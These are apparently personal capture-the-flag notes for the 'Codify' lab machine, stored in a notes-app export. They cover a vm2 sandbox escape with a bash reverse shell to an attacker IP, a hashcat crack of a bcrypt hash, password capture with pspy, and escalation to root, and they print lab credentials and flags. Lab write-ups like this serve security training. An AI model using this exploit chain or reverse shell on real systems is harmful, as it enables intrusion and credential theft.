      <node name="exploit" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699254497" ts_lastsave="1699329773">
        <rich_text link="webs http://codify.htb/about">http://codify.htb/about</rich_text>
        <rich_text>

google for exploit, vm2



const {VM} = require("vm2");
const vm = new VM();

const code = `
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
    [customInspectSymbol]: (depth, opt, inspect) =&gt; {
        inspect.constructor('return process')().mainModule.require('child_process').execSync('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.86/9002 0&gt;&amp;1"');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=&gt;{});
`;

vm.run(code);



nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.86] from (UNKNOWN) [10.129.68.166] 36628
bash: cannot set terminal process group (1239): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ whoami
whoami
svc
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~$

run linpeas.sh

svc@codify:/var/www/contact$ ls -l
total 112
-rw-rw-r-- 1 svc svc  4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc svc   268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc svc 77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc svc  4096 Apr 21  2023 templates
-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.db

cat tickets.db

joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

hashcat -m 3200 hash rockyou.txt

joshua:spongebob1

ssh to box

ssh joshua@codify.htb
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
Last login: Mon Nov  6 20:21:25 2023 from 10.10.14.86
joshua@codify:~$ whoami
joshua
joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
joshua@codify:~$ cat user.txt
b26648b39db502634eba843135592e9f

joshua@codify:/opt/scripts$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!

run pspy

2023/11/06 21:01:05 CMD: UID=0     PID=41729  | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/06 21:01:05 CMD: UID=0     PID=41730  | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/06 21:01:06 CMD: UID=0     PID=41731  | 
2023/11/06 21:01:06 CMD: UID=0     PID=41733  | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/06 21:01:06 CMD: UID=0     PID=41732  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys 
2023/11/06 21:01:06 CMD: UID=0     PID=41734  | /bin/bash /opt/scripts/mysql-backup.sh 
2023/11/06 21:01:06 CMD: UID=0     PID=41735  | /bin/bash /opt/scripts/mysql-backup.sh


kljh12k3jhaskjh12kjh3


joshua@codify:/opt/scripts$ su -
Password: 
root@codify:~# cd
root@codify:~# cat root.txt
5b6c3b537f75b186017e72858ded61cf
root@codify:~#


</rich_text>
      </node>
    </node>
  </node>
</cherrytree>
